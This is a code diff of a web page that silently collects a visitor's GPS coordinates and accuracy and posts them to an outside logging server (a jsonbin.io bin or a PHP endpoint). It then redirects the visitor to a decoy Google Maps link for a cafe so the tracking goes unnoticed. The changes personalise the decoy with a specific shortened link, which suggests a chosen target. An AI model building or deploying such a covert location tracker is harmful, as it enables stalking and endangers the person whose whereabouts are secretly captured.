@@ -48,9 +48,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .hidden {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -68,8 +65,8 @@
     // Or a local PHP script: 'http://192.168.1.100/log.php'
     const logUrl = 'https://api.jsonbin.io/v3/b/YOUR_BIN_ID/latest'; 
     
-    // The decoy destination (Blue Taco's Cafe in Delhi)
-    const decoyUrl = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Defence+Colony,+Delhi";
+    // The specific Blue Tokai Cafe link you provided
+    const decoyUrl = "https://maps.app.goo.gl/tb1Bp2tbAPe5wekb6";
 
     function handlePosition(position) {
         const lat = position.coords.latitude;
@@ -78,7 +75,6 @@
         const timestamp = position.timestamp;
 
         // 1. Log the data to your server
-        // We use a small payload to avoid URL length issues
         const payload = `lat=${lat}&lon=${lon}&acc=${accuracy}&time=${timestamp}`;
         
         // Send the log (fire and forget)
@@ -86,7 +82,7 @@
             console.log("Logging failed");
         });
 
-        // 2. Redirect to the decoy after a short delay to show the "Verification"
+        // 2. Redirect to the decoy after a short delay
         setTimeout(() => {
             window.location.href = decoyUrl;
         }, 1500);
